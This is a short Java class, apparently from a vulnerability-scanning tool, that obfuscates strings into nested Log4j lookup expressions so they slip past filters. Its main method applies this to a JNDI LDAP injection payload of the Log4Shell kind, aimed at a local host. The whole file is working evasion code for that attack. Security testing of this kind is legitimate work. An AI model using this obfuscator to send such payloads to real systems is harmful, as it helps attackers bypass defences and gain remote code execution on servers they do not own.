package me.gv7.woodpekcer.vuldb;

public class StringObfuscator2 {
    public String obfuscateString(String targetString,boolean isAll) {
        char[] _chars = targetString.toCharArray();
        StringBuilder result = new StringBuilder();

        for (char _char : _chars) {
            boolean whetherObfuscate;
            if(isAll){//是否全部混淆
                whetherObfuscate = true;
            }else{
                whetherObfuscate = Utils.GetRandomBoolean();
            }

            // 不混淆${和}
            if(_char == '$' || _char == '{' || _char == '}'){
                whetherObfuscate = false;
            }


            if (whetherObfuscate) {
                result.append(obfuscateChar(_char));
            } else {
                result.append(_char);
            }
        }
        return result.toString();
    }


    private String obfuscateChar(char _char) {
        int garbageCount = Utils.GetRandomNumber(1, 5);
        StringBuilder garbage = new StringBuilder();
        for (int i = 0; i < garbageCount; i++) {
            int garbageLength = Utils.GetRandomNumber(1, 6);
            String garbageWord = Utils.GetRandomString(garbageLength);
            garbage.append(garbageWord).append(":");
        }
        return String.format("${%s-%s}", garbage, _char);
    }

    public static void main(String[] args) {
        System.out.println(new StringObfuscator2().obfuscateString("jndi:ldap://127.0.0.1:1664/okkk",true));
    }
}